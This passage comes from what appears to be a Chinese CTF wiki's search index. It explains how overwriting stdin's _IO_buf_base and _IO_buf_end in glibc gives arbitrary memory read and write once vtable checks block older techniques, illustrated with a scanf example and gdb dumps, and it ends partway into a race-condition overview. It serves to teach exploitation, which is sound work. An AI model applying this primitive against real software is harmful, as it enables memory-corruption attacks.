\u5229\u7528\u4e4b\u540e\uff0c\u5229\u7528\u7684\u5173\u6ce8\u70b9\u4ecevtable\u8f6c\u79fb\u5230_IO_FILE\u7ed3\u6784\u5185\u90e8\u7684\u57df\u4e2d\u3002\n\u524d\u9762\u4ecb\u7ecd\u8fc7_IO_FILE\u5728\u4f7f\u7528\u6807\u51c6IO\u5e93\u65f6\u4f1a\u8fdb\u884c\u521b\u5efa\u5e76\u8d1f\u8d23\u7ef4\u62a4\u4e00\u4e9b\u76f8\u5173\u4fe1\u606f\uff0c\u5176\u4e2d\u6709\u4e00\u4e9b\u57df\u662f\u8868\u793a\u8c03\u7528\u8bf8\u5982fwrite\u3001fread\u7b49\u51fd\u6570\u65f6\u5199\u5165\u5730\u5740\u6216\u8bfb\u53d6\u5730\u5740\u7684\uff0c\u5982\u679c\u53ef\u4ee5\u63a7\u5236\u8fd9\u4e9b\u6570\u636e\u5c31\u53ef\u4ee5\u5b9e\u73b0\u4efb\u610f\u5730\u5740\u5199\u6216\u4efb\u610f\u5730\u5740\u8bfb\u3002\n\n\nstruct _IO_FILE {\n  int _flags;       /* High-order word is _IO_MAGIC; rest is flags. */\n  /* The following pointers correspond to the C++ streambuf protocol. */\n  /* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */\n  char* _IO_read_ptr;   /* Current read pointer */\n  char* _IO_read_end;   /* End of get area. */\n  char* _IO_read_base;  /* Start of putback+get area. */\n  char* _IO_write_base; /* Start of put area. */\n  char* _IO_write_ptr;  /* Current put pointer. */\n  char* _IO_write_end;  /* End of put area. */\n  char* _IO_buf_base;   /* Start of reserve area. */\n  char* _IO_buf_end;    /* End of reserve area. */\n  /* The following fields are used to support backing up and undo. */\n  char *_IO_save_base; /* Pointer to start of non-current get area. */\n  char *_IO_backup_base;  /* Pointer to first valid character of backup area */\n  char *_IO_save_end; /* Pointer to end of non-current get area. */\n\n  struct _IO_marker *_markers;\n\n  struct _IO_FILE *_chain;\n\n  int _fileno;\n  int _flags2;\n  _IO_off_t _old_offset; /* This used to be _offset but it\ns too small.  */\n};\n\n\n\n\n\u56e0\u4e3a\u8fdb\u7a0b\u4e2d\u5305\u542b\u4e86\u7cfb\u7edf\u9ed8\u8ba4\u7684\u4e09\u4e2a\u6587\u4ef6\u6d41stdin\\stdout\\stderr\uff0c\u56e0\u6b64\u8fd9\u79cd\u65b9\u5f0f\u53ef\u4ee5\u4e0d\u9700\u8981\u8fdb\u7a0b\u4e2d\u5b58\u5728\u6587\u4ef6\u64cd\u4f5c\uff0c\u901a\u8fc7scanf\\printf\u4e00\u6837\u53ef\u4ee5\u8fdb\u884c\u5229\u7528\u3002\n\n\n\u5728_IO_FILE\u4e2d_IO_buf_base\u8868\u793a\u64cd\u4f5c\u7684\u8d77\u59cb\u5730\u5740\uff0c_IO_buf_end\u8868\u793a\u7ed3\u675f\u5730\u5740\uff0c\u901a\u8fc7\u63a7\u5236\u8fd9\u4e24\u4e2a\u6570\u636e\u53ef\u4ee5\u5b9e\u73b0\u63a7\u5236\u8bfb\u5199\u7684\u64cd\u4f5c\u3002\n\n\n\u793a\u4f8b\n\n\n\u7b80\u5355\u7684\u89c2\u5bdf\u4e00\u4e0b_IO_FILE\u5bf9\u4e8e\u8c03\u7528scanf\u7684\u4f5c\u7528\n\n\n#include \nstdio.h\n\n\nchar buf[100];\n\nint main()\n{\n char stack_buf[100];\n scanf(\n%s\n,stack_buf);\n scanf(\n%s\n,stack_buf);\n\n}\n\n\n\n\n\u5728\u6267\u884c\u7a0b\u5e8f\u7b2c\u4e00\u6b21\u4f7f\u7528stdin\u4e4b\u524d\uff0cstdin\u7684\u5185\u5bb9\u8fd8\u672a\u521d\u59cb\u5316\u662f\u7a7a\u7684\n\n\n0x7ffff7dd18e0 \n_IO_2_1_stdin_\n:    0x00000000fbad2088  0x0000000000000000\n0x7ffff7dd18f0 \n_IO_2_1_stdin_+16\n: 0x0000000000000000  0x0000000000000000\n0x7ffff7dd1900 \n_IO_2_1_stdin_+32\n: 0x0000000000000000  0x0000000000000000\n0x7ffff7dd1910 \n_IO_2_1_stdin_+48\n: 0x0000000000000000  0x0000000000000000\n0x7ffff7dd1920 \n_IO_2_1_stdin_+64\n: 0x0000000000000000  0x0000000000000000\n0x7ffff7dd1930 \n_IO_2_1_stdin_+80\n: 0x0000000000000000  0x0000000000000000\n0x7ffff7dd1940 \n_IO_2_1_stdin_+96\n: 0x0000000000000000  0x0000000000000000\n0x7ffff7dd1950 \n_IO_2_1_stdin_+112\n:    0x0000000000000000  0xffffffffffffffff\n0x7ffff7dd1960 \n_IO_2_1_stdin_+128\n:    0x0000000000000000  0x00007ffff7dd3790\n0x7ffff7dd1970 \n_IO_2_1_stdin_+144\n:    0xffffffffffffffff  0x0000000000000000\n0x7ffff7dd1980 \n_IO_2_1_stdin_+160\n:    0x00007ffff7dd19c0  0x0000000000000000\n0x7ffff7dd1990 \n_IO_2_1_stdin_+176\n:    0x0000000000000000  0x0000000000000000\n0x7ffff7dd19a0 \n_IO_2_1_stdin_+192\n:    0x0000000000000000  0x0000000000000000\n0x7ffff7dd19b0 \n_IO_2_1_stdin_+208\n:    0x0000000000000000  0x00007ffff7dd06e0 \n== vtable\n\n\n\n\n\u8c03\u7528scanf\u4e4b\u540e\u53ef\u4ee5\u770b\u5230_IO_read_ptr\u3001_IO_read_base\u3001_IO_read_end\u3001_IO_buf_base\u3001_IO_buf_end\u7b49\u57df\u90fd\u88ab\u521d\u59cb\u5316\n\n\n0x7ffff7dd18e0 \n_IO_2_1_stdin_\n:    0x00000000fbad2288  0x0000000000602013\n0x7ffff7dd18f0 \n_IO_2_1_stdin_+16\n: 0x0000000000602014  0x0000000000602010\n0x7ffff7dd1900 \n_IO_2_1_stdin_+32\n: 0x0000000000602010  0x0000000000602010\n0x7ffff7dd1910 \n_IO_2_1_stdin_+48\n: 0x0000000000602010  0x0000000000602010\n0x7ffff7dd1920 \n_IO_2_1_stdin_+64\n: 0x0000000000602410  0x0000000000000000\n0x7ffff7dd1930 \n_IO_2_1_stdin_+80\n: 0x0000000000000000  0x0000000000000000\n0x7ffff7dd1940 \n_IO_2_1_stdin_+96\n: 0x0000000000000000  0x0000000000000000\n0x7ffff7dd1950 \n_IO_2_1_stdin_+112\n:    0x0000000000000000  0xffffffffffffffff\n0x7ffff7dd1960 \n_IO_2_1_stdin_+128\n:    0x0000000000000000  0x00007ffff7dd3790\n0x7ffff7dd1970 \n_IO_2_1_stdin_+144\n:    0xffffffffffffffff  0x0000000000000000\n0x7ffff7dd1980 \n_IO_2_1_stdin_+160\n:    0x00007ffff7dd19c0  0x0000000000000000\n0x7ffff7dd1990 \n_IO_2_1_stdin_+176\n:    0x0000000000000000  0x0000000000000000\n0x7ffff7dd19a0 \n_IO_2_1_stdin_+192\n:    0x00000000ffffffff  0x0000000000000000\n0x7ffff7dd19b0 \n_IO_2_1_stdin_+208\n:    0x0000000000000000  0x00007ffff7dd06e0\n\n\n\n\n\u8fdb\u4e00\u6b65\u601d\u8003\u53ef\u4ee5\u53d1\u73b0\u5176\u5b9estdin\u521d\u59cb\u5316\u7684\u5185\u5b58\u662f\u5728\u5806\u4e0a\u5206\u914d\u51fa\u6765\u7684\uff0c\u5728\u8fd9\u91cc\u5806\u7684\u57fa\u5740\u662f0x602000\uff0c\u56e0\u4e3a\u4e4b\u524d\u6ca1\u6709\u5806\u5206\u914d\u56e0\u6b64\u7f13\u51b2\u533a\u7684\u5730\u5740\u4e5f\u662f0x602010\n\n\nStart              End                Offset             Perm Path\n0x0000000000400000 0x0000000000401000 0x0000000000000000 r-x /home/vb/\u684c\u9762/tst/1/t1\n0x0000000000600000 0x0000000000601000 0x0000000000000000 r-- /home/vb/\u684c\u9762/tst/1/t1\n0x0000000000601000 0x0000000000602000 0x0000000000001000 rw- /home/vb/\u684c\u9762/tst/1/t1\n0x0000000000602000 0x0000000000623000 0x0000000000000000 rw- [heap]\n\n\n\n\n\u5206\u914d\u7684\u5806\u5927\u5c0f\u662f0x400\u4e2a\u5b57\u8282\uff0c\u6b63\u597d\u5bf9\u5e94\u4e8e_IO_buf_base\uff5e_IO_buf_end\n\u5728\u8fdb\u884c\u5199\u5165\u540e\uff0c\u53ef\u4ee5\u770b\u5230\u7f13\u51b2\u533a\u4e2d\u6709\u6211\u4eec\u5199\u5165\u7684\u6570\u636e\uff0c\u4e4b\u540e\u76ee\u7684\u5730\u5740\u6808\u4e2d\u7684\u7f13\u51b2\u533a\u4e5f\u4f1a\u5199\u5165\u6570\u636e\n\n\n0x602000:   0x0000000000000000  0x0000000000000411 \n== \u5206\u914d0x400\u5927\u5c0f\n0x602010:   0x000000000a333231  0x0000000000000000 \n== \u7f13\u51b2\u6570\u636e\n0x602020:   0x0000000000000000  0x0000000000000000\n0x602030:   0x0000000000000000  0x0000000000000000\n0x602040:   0x0000000000000000  0x0000000000000000\n\n\n\n\n\u63a5\u4e0b\u6765\u6211\u4eec\u5c1d\u8bd5\u4fee\u6539_IO_buf_base\u6765\u5b9e\u73b0\u4efb\u610f\u5730\u5740\u8bfb\u5199\uff0c\u5168\u5c40\u7f13\u51b2\u533abuf\u7684\u5730\u5740\u662f0x7ffff7dd2740\u3002\u4fee\u6539_IO_buf_base\u548c_IO_buf_end\u5230\u7f13\u51b2\u533abuf\u7684\u5730\u5740\n\n\n0x7ffff7dd18e0 \n_IO_2_1_stdin_\n:    0x00000000fbad2288  0x0000000000602013\n0x7ffff7dd18f0 \n_IO_2_1_stdin_+16\n: 0x0000000000602014  0x0000000000602010\n0x7ffff7dd1900 \n_IO_2_1_stdin_+32\n: 0x0000000000602010  0x0000000000602010\n0x7ffff7dd1910 \n_IO_2_1_stdin_+48\n: 0x0000000000602010  0x00007ffff7dd2740 \n== _IO_buf_base\n0x7ffff7dd1920 \n_IO_2_1_stdin_+64\n: 0x00007ffff7dd27c0  0x0000000000000000 \n== _IO_buf_end\n0x7ffff7dd1930 \n_IO_2_1_stdin_+80\n: 0x0000000000000000  0x0000000000000000\n0x7ffff7dd1940 \n_IO_2_1_stdin_+96\n: 0x0000000000000000  0x0000000000000000\n0x7ffff7dd1950 \n_IO_2_1_stdin_+112\n:    0x0000000000000000  0xffffffffffffffff\n0x7ffff7dd1960 \n_IO_2_1_stdin_+128\n:    0x0000000000000000  0x00007ffff7dd3790\n0x7ffff7dd1970 \n_IO_2_1_stdin_+144\n:    0xffffffffffffffff  0x0000000000000000\n0x7ffff7dd1980 \n_IO_2_1_stdin_+160\n:    0x00007ffff7dd19c0  0x0000000000000000\n0x7ffff7dd1990 \n_IO_2_1_stdin_+176\n:    0x0000000000000000  0x0000000000000000\n0x7ffff7dd19a0 \n_IO_2_1_stdin_+192\n:    0x00000000ffffffff  0x0000000000000000\n0x7ffff7dd19b0 \n_IO_2_1_stdin_+208\n:    0x0000000000000000  0x00007ffff7dd06e0\n\n\n\n\n\u4e4b\u540escanf\u7684\u8bfb\u5165\u6570\u636e\u5c31\u4f1a\u5199\u5165\u52300x7ffff7dd2740\u7684\u4f4d\u7f6e\n\n\n0x7ffff7dd2740 \nbuf\n:   0x00000a6161616161  0x0000000000000000\n0x7ffff7dd2750 \nbuffer\n:    0x0000000000000000  0x0000000000000000\n0x7ffff7dd2760 \nbuffer\n:    0x0000000000000000  0x0000000000000000\n0x7ffff7dd2770 \nbuffer\n:    0x0000000000000000  0x0000000000000000\n0x7ffff7dd2780 \nbuffer\n:    0x0000000000000000  0x0000000000000000", 
            "title": "\u65b0\u7248\u672c libc \u4e0b IO_FILE \u7684\u5229\u7528"
        }, 
        {
            "location": "/pwn/io_file/exploit-in-libc2.24/#libcio_file", 
            "text": "", 
            "title": "\u65b0\u7248\u672clibc\u4e0bIO_FILE\u7684\u5229\u7528"
        }, 
        {
            "location": "/pwn/io_file/exploit-in-libc2.24/#_1", 
            "text": "\u5728\u6700\u65b0\u7248\u672c\u7684glibc\u4e2d(2.24)\uff0c\u5168\u65b0\u52a0\u5165\u4e86\u9488\u5bf9IO_FILE_plus\u7684vtable\u52ab\u6301\u7684\u68c0\u6d4b\u63aa\u65bd\uff0cglibc\n\u4f1a\u5728\u8c03\u7528\u865a\u51fd\u6570\u4e4b\u524d\u9996\u5148\u68c0\u67e5vtable\u5730\u5740\u7684\u5408\u6cd5\u6027\u3002  \u5982\u679cvtable\u662f\u975e\u6cd5\u7684\uff0c\u90a3\u4e48\u4f1a\u5f15\u53d1abort\u3002  \u9996\u5148\u4f1a\u9a8c\u8bc1vtable\u662f\u5426\u4f4d\u4e8e_IO_vtable\u6bb5\u4e2d\uff0c\u5982\u679c\u6ee1\u8db3\u6761\u4ef6\u5c31\u6b63\u5e38\u6267\u884c\uff0c\u5426\u5219\u4f1a\u8c03\u7528_IO_vtable_check\u505a\u8fdb\u4e00\u6b65\u68c0\u67e5\u3002  \u8fd9\u91cc\u7684\u68c0\u67e5\u4f7f\u5f97\u4ee5\u5f80\u4f7f\u7528vtable\u8fdb\u884c\u5229\u7528\u7684\u6280\u672f\u5f88\u96be\u5b9e\u73b0", 
            "title": "\u4ecb\u7ecd"
        }, 
        {
            "location": "/pwn/io_file/exploit-in-libc2.24/#_2", 
            "text": "\u5728vtable\u96be\u4ee5\u88ab\u5229\u7528\u4e4b\u540e\uff0c\u5229\u7528\u7684\u5173\u6ce8\u70b9\u4ecevtable\u8f6c\u79fb\u5230_IO_FILE\u7ed3\u6784\u5185\u90e8\u7684\u57df\u4e2d\u3002\n\u524d\u9762\u4ecb\u7ecd\u8fc7_IO_FILE\u5728\u4f7f\u7528\u6807\u51c6IO\u5e93\u65f6\u4f1a\u8fdb\u884c\u521b\u5efa\u5e76\u8d1f\u8d23\u7ef4\u62a4\u4e00\u4e9b\u76f8\u5173\u4fe1\u606f\uff0c\u5176\u4e2d\u6709\u4e00\u4e9b\u57df\u662f\u8868\u793a\u8c03\u7528\u8bf8\u5982fwrite\u3001fread\u7b49\u51fd\u6570\u65f6\u5199\u5165\u5730\u5740\u6216\u8bfb\u53d6\u5730\u5740\u7684\uff0c\u5982\u679c\u53ef\u4ee5\u63a7\u5236\u8fd9\u4e9b\u6570\u636e\u5c31\u53ef\u4ee5\u5b9e\u73b0\u4efb\u610f\u5730\u5740\u5199\u6216\u4efb\u610f\u5730\u5740\u8bfb\u3002  struct _IO_FILE {\n  int _flags;       /* High-order word is _IO_MAGIC; rest is flags. */\n  /* The following pointers correspond to the C++ streambuf protocol. */\n  /* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */\n  char* _IO_read_ptr;   /* Current read pointer */\n  char* _IO_read_end;   /* End of get area. */\n  char* _IO_read_base;  /* Start of putback+get area. */\n  char* _IO_write_base; /* Start of put area. */\n  char* _IO_write_ptr;  /* Current put pointer. */\n  char* _IO_write_end;  /* End of put area. */\n  char* _IO_buf_base;   /* Start of reserve area. */\n  char* _IO_buf_end;    /* End of reserve area. */\n  /* The following fields are used to support backing up and undo. */\n  char *_IO_save_base; /* Pointer to start of non-current get area. */\n  char *_IO_backup_base;  /* Pointer to first valid character of backup area */\n  char *_IO_save_end; /* Pointer to end of non-current get area. */\n\n  struct _IO_marker *_markers;\n\n  struct _IO_FILE *_chain;\n\n  int _fileno;\n  int _flags2;\n  _IO_off_t _old_offset; /* This used to be _offset but it s too small.  */\n};  \u56e0\u4e3a\u8fdb\u7a0b\u4e2d\u5305\u542b\u4e86\u7cfb\u7edf\u9ed8\u8ba4\u7684\u4e09\u4e2a\u6587\u4ef6\u6d41stdin\\stdout\\stderr\uff0c\u56e0\u6b64\u8fd9\u79cd\u65b9\u5f0f\u53ef\u4ee5\u4e0d\u9700\u8981\u8fdb\u7a0b\u4e2d\u5b58\u5728\u6587\u4ef6\u64cd\u4f5c\uff0c\u901a\u8fc7scanf\\printf\u4e00\u6837\u53ef\u4ee5\u8fdb\u884c\u5229\u7528\u3002  \u5728_IO_FILE\u4e2d_IO_buf_base\u8868\u793a\u64cd\u4f5c\u7684\u8d77\u59cb\u5730\u5740\uff0c_IO_buf_end\u8868\u793a\u7ed3\u675f\u5730\u5740\uff0c\u901a\u8fc7\u63a7\u5236\u8fd9\u4e24\u4e2a\u6570\u636e\u53ef\u4ee5\u5b9e\u73b0\u63a7\u5236\u8bfb\u5199\u7684\u64cd\u4f5c\u3002", 
            "title": "\u65b0\u7684\u5229\u7528\u6280\u672f"
        }, 
        {
            "location": "/pwn/io_file/exploit-in-libc2.24/#_3", 
            "text": "\u7b80\u5355\u7684\u89c2\u5bdf\u4e00\u4e0b_IO_FILE\u5bf9\u4e8e\u8c03\u7528scanf\u7684\u4f5c\u7528  #include  stdio.h \n\nchar buf[100];\n\nint main()\n{\n char stack_buf[100];\n scanf( %s ,stack_buf);\n scanf( %s ,stack_buf);\n\n}  \u5728\u6267\u884c\u7a0b\u5e8f\u7b2c\u4e00\u6b21\u4f7f\u7528stdin\u4e4b\u524d\uff0cstdin\u7684\u5185\u5bb9\u8fd8\u672a\u521d\u59cb\u5316\u662f\u7a7a\u7684  0x7ffff7dd18e0  _IO_2_1_stdin_ :    0x00000000fbad2088  0x0000000000000000\n0x7ffff7dd18f0  _IO_2_1_stdin_+16 : 0x0000000000000000  0x0000000000000000\n0x7ffff7dd1900  _IO_2_1_stdin_+32 : 0x0000000000000000  0x0000000000000000\n0x7ffff7dd1910  _IO_2_1_stdin_+48 : 0x0000000000000000  0x0000000000000000\n0x7ffff7dd1920  _IO_2_1_stdin_+64 : 0x0000000000000000  0x0000000000000000\n0x7ffff7dd1930  _IO_2_1_stdin_+80 : 0x0000000000000000  0x0000000000000000\n0x7ffff7dd1940  _IO_2_1_stdin_+96 : 0x0000000000000000  0x0000000000000000\n0x7ffff7dd1950  _IO_2_1_stdin_+112 :    0x0000000000000000  0xffffffffffffffff\n0x7ffff7dd1960  _IO_2_1_stdin_+128 :    0x0000000000000000  0x00007ffff7dd3790\n0x7ffff7dd1970  _IO_2_1_stdin_+144 :    0xffffffffffffffff  0x0000000000000000\n0x7ffff7dd1980  _IO_2_1_stdin_+160 :    0x00007ffff7dd19c0  0x0000000000000000\n0x7ffff7dd1990  _IO_2_1_stdin_+176 :    0x0000000000000000  0x0000000000000000\n0x7ffff7dd19a0  _IO_2_1_stdin_+192 :    0x0000000000000000  0x0000000000000000\n0x7ffff7dd19b0  _IO_2_1_stdin_+208 :    0x0000000000000000  0x00007ffff7dd06e0  == vtable  \u8c03\u7528scanf\u4e4b\u540e\u53ef\u4ee5\u770b\u5230_IO_read_ptr\u3001_IO_read_base\u3001_IO_read_end\u3001_IO_buf_base\u3001_IO_buf_end\u7b49\u57df\u90fd\u88ab\u521d\u59cb\u5316  0x7ffff7dd18e0  _IO_2_1_stdin_ :    0x00000000fbad2288  0x0000000000602013\n0x7ffff7dd18f0  _IO_2_1_stdin_+16 : 0x0000000000602014  0x0000000000602010\n0x7ffff7dd1900  _IO_2_1_stdin_+32 : 0x0000000000602010  0x0000000000602010\n0x7ffff7dd1910  _IO_2_1_stdin_+48 : 0x0000000000602010  0x0000000000602010\n0x7ffff7dd1920  _IO_2_1_stdin_+64 : 0x0000000000602410  0x0000000000000000\n0x7ffff7dd1930  _IO_2_1_stdin_+80 : 0x0000000000000000  0x0000000000000000\n0x7ffff7dd1940  _IO_2_1_stdin_+96 : 0x0000000000000000  0x0000000000000000\n0x7ffff7dd1950  _IO_2_1_stdin_+112 :    0x0000000000000000  0xffffffffffffffff\n0x7ffff7dd1960  _IO_2_1_stdin_+128 :    0x0000000000000000  0x00007ffff7dd3790\n0x7ffff7dd1970  _IO_2_1_stdin_+144 :    0xffffffffffffffff  0x0000000000000000\n0x7ffff7dd1980  _IO_2_1_stdin_+160 :    0x00007ffff7dd19c0  0x0000000000000000\n0x7ffff7dd1990  _IO_2_1_stdin_+176 :    0x0000000000000000  0x0000000000000000\n0x7ffff7dd19a0  _IO_2_1_stdin_+192 :    0x00000000ffffffff  0x0000000000000000\n0x7ffff7dd19b0  _IO_2_1_stdin_+208 :    0x0000000000000000  0x00007ffff7dd06e0  \u8fdb\u4e00\u6b65\u601d\u8003\u53ef\u4ee5\u53d1\u73b0\u5176\u5b9estdin\u521d\u59cb\u5316\u7684\u5185\u5b58\u662f\u5728\u5806\u4e0a\u5206\u914d\u51fa\u6765\u7684\uff0c\u5728\u8fd9\u91cc\u5806\u7684\u57fa\u5740\u662f0x602000\uff0c\u56e0\u4e3a\u4e4b\u524d\u6ca1\u6709\u5806\u5206\u914d\u56e0\u6b64\u7f13\u51b2\u533a\u7684\u5730\u5740\u4e5f\u662f0x602010  Start              End                Offset             Perm Path\n0x0000000000400000 0x0000000000401000 0x0000000000000000 r-x /home/vb/\u684c\u9762/tst/1/t1\n0x0000000000600000 0x0000000000601000 0x0000000000000000 r-- /home/vb/\u684c\u9762/tst/1/t1\n0x0000000000601000 0x0000000000602000 0x0000000000001000 rw- /home/vb/\u684c\u9762/tst/1/t1\n0x0000000000602000 0x0000000000623000 0x0000000000000000 rw- [heap]  \u5206\u914d\u7684\u5806\u5927\u5c0f\u662f0x400\u4e2a\u5b57\u8282\uff0c\u6b63\u597d\u5bf9\u5e94\u4e8e_IO_buf_base\uff5e_IO_buf_end\n\u5728\u8fdb\u884c\u5199\u5165\u540e\uff0c\u53ef\u4ee5\u770b\u5230\u7f13\u51b2\u533a\u4e2d\u6709\u6211\u4eec\u5199\u5165\u7684\u6570\u636e\uff0c\u4e4b\u540e\u76ee\u7684\u5730\u5740\u6808\u4e2d\u7684\u7f13\u51b2\u533a\u4e5f\u4f1a\u5199\u5165\u6570\u636e  0x602000:   0x0000000000000000  0x0000000000000411  == \u5206\u914d0x400\u5927\u5c0f\n0x602010:   0x000000000a333231  0x0000000000000000  == \u7f13\u51b2\u6570\u636e\n0x602020:   0x0000000000000000  0x0000000000000000\n0x602030:   0x0000000000000000  0x0000000000000000\n0x602040:   0x0000000000000000  0x0000000000000000  \u63a5\u4e0b\u6765\u6211\u4eec\u5c1d\u8bd5\u4fee\u6539_IO_buf_base\u6765\u5b9e\u73b0\u4efb\u610f\u5730\u5740\u8bfb\u5199\uff0c\u5168\u5c40\u7f13\u51b2\u533abuf\u7684\u5730\u5740\u662f0x7ffff7dd2740\u3002\u4fee\u6539_IO_buf_base\u548c_IO_buf_end\u5230\u7f13\u51b2\u533abuf\u7684\u5730\u5740  0x7ffff7dd18e0  _IO_2_1_stdin_ :    0x00000000fbad2288  0x0000000000602013\n0x7ffff7dd18f0  _IO_2_1_stdin_+16 : 0x0000000000602014  0x0000000000602010\n0x7ffff7dd1900  _IO_2_1_stdin_+32 : 0x0000000000602010  0x0000000000602010\n0x7ffff7dd1910  _IO_2_1_stdin_+48 : 0x0000000000602010  0x00007ffff7dd2740  == _IO_buf_base\n0x7ffff7dd1920  _IO_2_1_stdin_+64 : 0x00007ffff7dd27c0  0x0000000000000000  == _IO_buf_end\n0x7ffff7dd1930  _IO_2_1_stdin_+80 : 0x0000000000000000  0x0000000000000000\n0x7ffff7dd1940  _IO_2_1_stdin_+96 : 0x0000000000000000  0x0000000000000000\n0x7ffff7dd1950  _IO_2_1_stdin_+112 :    0x0000000000000000  0xffffffffffffffff\n0x7ffff7dd1960  _IO_2_1_stdin_+128 :    0x0000000000000000  0x00007ffff7dd3790\n0x7ffff7dd1970  _IO_2_1_stdin_+144 :    0xffffffffffffffff  0x0000000000000000\n0x7ffff7dd1980  _IO_2_1_stdin_+160 :    0x00007ffff7dd19c0  0x0000000000000000\n0x7ffff7dd1990  _IO_2_1_stdin_+176 :    0x0000000000000000  0x0000000000000000\n0x7ffff7dd19a0  _IO_2_1_stdin_+192 :    0x00000000ffffffff  0x0000000000000000\n0x7ffff7dd19b0  _IO_2_1_stdin_+208 :    0x0000000000000000  0x00007ffff7dd06e0  \u4e4b\u540escanf\u7684\u8bfb\u5165\u6570\u636e\u5c31\u4f1a\u5199\u5165\u52300x7ffff7dd2740\u7684\u4f4d\u7f6e  0x7ffff7dd2740  buf :   0x00000a6161616161  0x0000000000000000\n0x7ffff7dd2750  buffer :    0x0000000000000000  0x0000000000000000\n0x7ffff7dd2760  buffer :    0x0000000000000000  0x0000000000000000\n0x7ffff7dd2770  buffer :    0x0000000000000000  0x0000000000000000\n0x7ffff7dd2780  buffer :    0x0000000000000000  0x0000000000000000", 
            "title": "\u793a\u4f8b"
        }, 
        {
            "location": "/pwn/race-condition/introduction/", 
            "text": "Race Condition\n\n\n\u6982\u8ff0\n\n\n\u6761\u4ef6\u7ade\u4e89\u662f\u6307\u4e00\u4e2a\u7cfb\u7edf\u7684\u8fd0\u884c\u7ed3\u679c\u4f9d\u8d56\u4e8e\u4e0d\u53d7\u63a7\u5236\u7684\u4e8b\u4ef6\u7684\u5148\u540e\u987a\u5e8f\u3002\u5f53\u8fd9\u4e9b\u4e0d\u53d7\u63a7\u5236\u7684\u4e8b\u4ef6\u5e76\u6ca1\u6709\u6309\u7167\u5f00\u53d1\u8005\u60f3\u8981\u7684\u65b9\u5f0f\u8fd0\u884c\u65f6\uff0c\u5c31\u53ef\u80fd\u4f1a\u51fa\u73b0 bug\u3002\u8fd9\u4e2a\u672f\u8bed\u6700\u521d\u6765\u81ea\u4e8e\u4e24\u4e2a\u7535\u4fe1\u53f7\u4e92\u76f8\u7ade\u4e89\u6765\u5f71\u54cd\u8f93\u51fa\u7ed3\u679c\u3002\n\n\n\n\n\u6761\u4ef6\u7ade\u4e89\u4e3b\u8981\u51fa\u73b0\u5728\u5982\u4e0b\u9886\u57df\n\n\n\n\n\u7535\u5b50\u7cfb\u7edf\uff0c\u5c24\u5176\u662f\u903b\u8f91\u7535\u8def\n\n\n\u8ba1\u7b97\u673a\uff0c\u5c24\u5176\u662f\u591a\u7ebf\u7a0b\u7a0b\u5e8f\u548c\u5206\u5e03\u5f0f\u7a0b\u5e8f\u3002\n\n\n\n\n\u7531\u4e8e\u76ee\u524d\u7684\u7cfb\u7edf\u4e2d\u5927\u91cf\u91c7\u7528\u5e76\u53d1\u7f16\u7a0b\uff0c\u7ecf\u5e38\u5bf9\u8d44\u6e90\u8fdb\u884c\u5171\u4eab\uff0c\u5f80\u5f80\u4f1a\u4ea7\u751f\u6761\u4ef6\u7ade\u4e89\u6f0f\u6d1e\u3002\n\n\n\u8fd9\u91cc\u6211\u4eec\u4e3b\u8981\u8003\u8651\u8ba1\u7b97\u673a\u7a0b\u5e8f\u65b9\u9762\u7684\u6761\u4ef6\u7ade\u4e89\u3002\u5f53\u4e00\u4e2a\u8f6f\u4ef6\u7684\u8fd0\u884c\u7ed3\u679c\u4f9d\u8d56\u4e8e\u8fdb\u7a0b\u6216\u8005\u7ebf\u7a0b\u7684\u987a\u5e8f\u65f6\uff0c\u5c31\u53ef\u80fd\u4f1a\u51fa\u73b0\u6761\u4ef6\u7ade\u4e89\u3002\u7b80\u5355\u8003\u8651\u4e00\u4e0b\uff0c\u53ef\u4ee5\u77e5\u9053\u6761\u4ef6\u7ade\u4e89\u9700\u8981\u5982\u4e0b\u7684\n\u6761\u4ef6\n\uff1a\n\n\n\n\n\u5e76\u53d1\uff0c\u5373\u81f3\u5c11\u5b58\u5728\u4e24\u4e2a\u5e76\u53d1\u6267\u884c\u6d41\u3002\u8fd9\u91cc\u7684\u6267\u884c\u6d41\u5305\u62ec\u7ebf\u7a0b\uff0c\u8fdb\u7a0b\uff0c\u4efb\u52a1\u7b49\u7ea7\u522b\u7684\u6267\u884c\u6d41\u3002\n\n\n\u5171\u4eab\u5bf9\u8c61\uff0c\u5373\u591a\u4e2a\u5e76\u53d1\u6d41\u4f1a\u8bbf\u95ee\u540c\u4e00\u5bf9\u8c61\u3002\n\u5e38\u89c1\u7684\u5171\u4eab\u5bf9\u8c61\u6709\u5171\u4eab\u5185\u5b58\uff0c\u6587\u4ef6\u7cfb\u7edf\uff0c\u4fe1\u53f7\u3002\u4e00\u822c\u6765\u8bf4\uff0c\u8fd9\u4e9b\u5171\u4eab\u5bf9\u8c61\u662f\u7528\u6765\u4f7f\u5f97\u591a\u4e2a\u7a0b\u5e8f\u6267\u884c\u6d41\u76f8\u4e92\u4ea4\u6d41\u3002\n\u6b64\u5916\uff0c\u6211\u4eec\u79f0\u8bbf\u95ee\u5171\u4eab\u5bf9\u8c61\u7684\u4ee3\u7801\u4e3a\n\u4e34\u754c\u533a\n\u3002\u5728\u6b63\u5e38\u5199\u4ee3\u7801\u65f6\uff0c\u8fd9\u90e8\u5206\u5e94\u8be5\u52a0\u9501\u3002\n\n\n\u6539\u53d8\u5bf9\u8c61\uff0c\u5373\u81f3\u5c11\u6709\u4e00\u4e2a\u63a7\u5236\u6d41\u4f1a\u6539\u53d8\u7ade\u4e89\u5bf9\u8c61\u7684\u72b6\u6001\u3002\u56e0\u4e3a\u5982\u679c\u7a0b\u5e8f\u53ea\u662f\u5bf9\u5bf9\u8c61\u8fdb\u884c\u8bfb\u64cd\u4f5c\uff0c\u90a3\u4e48\u5e76\u4e0d\u4f1a\u4ea7\u751f\u6761\u4ef6\u7ade\u4e89\u3002\n\n\n\n\n\u7531\u4e8e\u5728\u5e76\u53d1\u65f6\uff0c\u6267\u884c\u6d41\u7684\u4e0d\u786e\u5b9a\u6027\u5f88\u5927\uff0c\u6761\u4ef6\u7ade\u4e89\u76f8\u5bf9\n\u96be\u5bdf\u89c9\n\uff0c\u5e76\u4e14\u5728\n\u590d\u73b0\u548c\u8c03\u8bd5\u65b9\u9762\u4f1a\u6bd4\u8f83\u56f0\u96be\n\u3002\u8fd9\u7ed9\u4fee\u590d\u6761\u4ef6\u7ade\u4e89\u4e5f\u5e26\u6765\u4e86\u4e0d\u5c0f\u7684\u56f0\u96be\u3002\n\n\n\u6761\u4ef6\u7ade\u4e89\u9020\u6210\u7684\u5f71\u54